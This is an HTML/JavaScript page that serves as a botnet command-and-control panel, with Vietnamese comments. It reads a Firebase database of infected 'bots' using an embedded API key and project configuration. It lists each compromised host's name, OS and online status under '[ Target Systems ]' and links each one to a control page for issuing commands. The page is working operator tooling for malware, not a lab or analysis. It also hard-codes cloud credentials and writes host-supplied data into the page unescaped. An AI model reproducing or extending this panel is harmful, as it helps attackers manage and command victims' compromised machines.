<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C&C Terminal</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');

        body {
            background-color: #0a0a0a;
            color: #00ff41;
            font-family: 'VT323', monospace;
            font-size: 1.2rem;
            text-shadow: 0 0 5px #00ff41;
            margin: 0;
            padding: 20px;
            background-image:
                repeating-linear-gradient(
                    #0a0a0a 0px, #0a0a0a 1px,
                    transparent 1px, transparent 2px
                );
        }
        .container {
            max-width: 900px;
            margin: auto;
            background: rgba(10, 20, 10, 0.1);
            border: 1px solid #00ff41;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
            padding: 20px;
        }
        h1 {
            text-align: center;
            color: #00ff41;
            text-transform: uppercase;
            letter-spacing: 5px;
            animation: blink-caret .75s step-end infinite;
        }
        #bot-list {
            list-style-type: none;
            padding: 0;
        }
        .bot-item {
            background: transparent;
            margin: 10px 0;
            padding: 15px;
            border-bottom: 1px dashed #004d14;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: background-color 0.3s;
        }
        .bot-item:hover {
            background-color: rgba(0, 255, 65, 0.1);
        }
        .bot-item a {
            text-decoration: none;
            color: #00ff41;
            font-weight: bold;
            font-size: 1.5rem;
        }
        .bot-info {
            font-size: 1rem;
            color: #00b32e;
        }
        .status-container {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .status-text {
            font-size: 1rem;
        }
        .status-text.online {
            color: #00ff41;
        }
        .status-text.offline {
            color: #888;
        }
        .status-indicator {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            animation: blink-indicator 1.5s infinite;
        }
        .status-indicator.online {
            background-color: #00ff41;
            box-shadow: 0 0 10px #00ff41;
        }
        .status-indicator.offline {
            background-color: #444;
            animation: none;
        }
        @keyframes blink-caret {
            from, to { border-right: 2px solid #00ff41; }
            50% { border-right-color: transparent; }
        }
        @keyframes blink-indicator {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>[ Target Systems ]</h1>
        <ul id="bot-list">
            <li>INITIALIZING CONNECTION TO C&C...</li>
        </ul>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";

        const firebaseConfig = {
          apiKey: "AIzaSyDmzm6X2MFSmEHc-trurDHlFMk71t47qqk",
          authDomain: "chat-4e280.firebaseapp.com",
          databaseURL: "https://chat-4e280-default-rtdb.firebaseio.com/",
          projectId: "chat-4e280",
          storageBucket: "chat-4e280.appspot.com",
          messagingSenderId: "264573039049",
          appId: "1:264573039049:web:d7cf8d4e61e822d2f6b818",
          measurementId: "G-BGY9LNDF1K"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        const botsRef = ref(database, 'bots');
        onValue(botsRef, (snapshot) => {
            const bots = snapshot.val();
            const botListEl = document.getElementById('bot-list');
            botListEl.innerHTML = '';

            if (!bots) {
                botListEl.innerHTML = '<li>NO TARGETS DETECTED. AWAITING CONNECTIONS...</li>';
                return;
            }

            // 1. Chuyển đổi object thành array và tính toán trạng thái
            const botArray = Object.keys(bots).map(botId => {
                const bot = bots[botId];
                const info = bot.info || {};
                const lastSeen = info.last_seen || 0;
                const isOnline = (Date.now() / 1000 - lastSeen) < 30; // Online nếu thấy trong 30 giây
                return {
                    id: botId,
                    info: info,
                    isOnline: isOnline
                };
            });

            // 2. Sắp xếp: online lên trên, offline xuống dưới
            botArray.sort((a, b) => {
                // Chuyển boolean thành số (true=1, false=0) để so sánh
                // b - a sẽ cho kết quả là 1, -1, hoặc 0, đẩy các mục 'true' lên đầu
                return b.isOnline - a.isOnline;
            });

            // 3. Hiển thị danh sách đã sắp xếp
            botArray.forEach(bot => {
                const li = document.createElement('li');
                li.className = 'bot-item';

                const statusClass = bot.isOnline ? 'online' : 'offline';
                const statusText = bot.isOnline ? 'ONLINE' : 'OFFLINE';

                li.innerHTML = `
                    <div>
                        <a href="control.html?bot_id=${bot.id}">${bot.info.hostname || 'UNKNOWN_HOST'}</a>
                        <div class="bot-info">ID: ${bot.id} // OS: ${bot.info.os || 'N/A'}</div>
                    </div>
                    <div class="status-container">
                        <span class="status-text ${statusClass}">${statusText}</span>
                        <div class="status-indicator ${statusClass}"></div>
                    </div>
                `;
                botListEl.appendChild(li);
            });
        });
    </script>
</body>
</html>
